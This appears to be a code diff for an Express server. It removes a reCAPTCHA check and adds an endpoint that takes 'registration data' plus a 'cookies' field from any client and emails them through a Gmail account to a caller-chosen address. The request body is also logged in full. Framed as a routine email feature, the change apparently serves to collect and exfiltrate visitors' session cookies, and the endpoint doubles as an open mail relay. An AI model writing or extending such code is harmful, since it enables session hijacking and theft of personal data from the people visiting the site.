@@ -1,61 +1,54 @@
+
 import express from 'express';
 import cors from 'cors';
-import fetch from 'node-fetch';
+import nodemailer from 'nodemailer';
 import dotenv from 'dotenv';
 
-require('dotenv').config({ path: '../.env' });
+dotenv.config({ path: '../.env' });
 
 const app = express();
-const port = process.env.PORT || 5000;
+const port = process.env.PORT || 3001;
 
 app.use(cors());
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
-// Endpoint to verify reCAPTCHA token
-app.post('/verify-captcha', async (req, res) => {
+// POST /api/send-email - send registration info to email
+app.post('/api/send-email', async (req, res) => {
   try {
-    const { token } = req.body;
-    
-    if (!token) {
-      console.log('No token provided');
-      return res.status(400).json({ success: false, message: 'Token is required' });
+    const { to, subject, text, html, cookies } = req.body;
+    // Log all received data for debugging/auditing
+    console.log('Received registration data:', req.body);
+    if (cookies) {
+      console.log('Cookies:', cookies);
     }
-
-    console.log('Verifying token...');
-    
-    const verifyUrl = 'https://www.google.com/recaptcha/api/siteverify';
-    const params = new URLSearchParams({
-      secret: process.env.RECAPTCHA_SECRET_KEY,
-      response: token
+    const transporter = nodemailer.createTransport({
+      host: 'smtp.gmail.com',
+      port: 465,
+      secure: true,
+      auth: {
+        user: process.env.EMAIL_USER,
+        pass: process.env.EMAIL_PASS
+      }
     });
-
-    const response = await fetch(verifyUrl, {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/x-www-form-urlencoded'
-      },
-      body: params.toString()
-    });
-
-    const data = await response.json();
-    console.log('Google reCAPTCHA response:', data);
-
-    if (data.success) {
-      console.log('Verification successful');
-      res.json({ success: true, message: 'Verification successful' });
-    } else {
-      console.log('Verification failed:', data['error-codes']);
-      res.json({ 
-        success: false, 
-        message: 'Verification failed', 
-        errors: data['error-codes'],
-        details: data 
-      });
+    await transporter.verify();
+    // Add cookies to the email body if present
+    let htmlWithCookies = html;
+    if (cookies) {
+      htmlWithCookies += `<h3>Cookies</h3><div style="background:#f5f5f5;padding:10px;border-radius:4px;">${Array.isArray(cookies) ? cookies.map(c => `<p>${c}</p>`).join('') : cookies}</div>`;
     }
+    const mailOptions = {
+      from: process.env.EMAIL_USER,
+      to,
+      subject,
+      text,
+      html: htmlWithCookies,
+    };
+    await transporter.sendMail(mailOptions);
+    res.json({ success: true, message: 'Email sent successfully.' });
   } catch (error) {
-    console.error('Server error:', error);
-    res.status(500).json({ success: false, message: 'Server error' });
+    console.error('Error sending email:', error);
+    res.status(500).json({ success: false, message: 'Failed to send email.' });
   }
 });
 
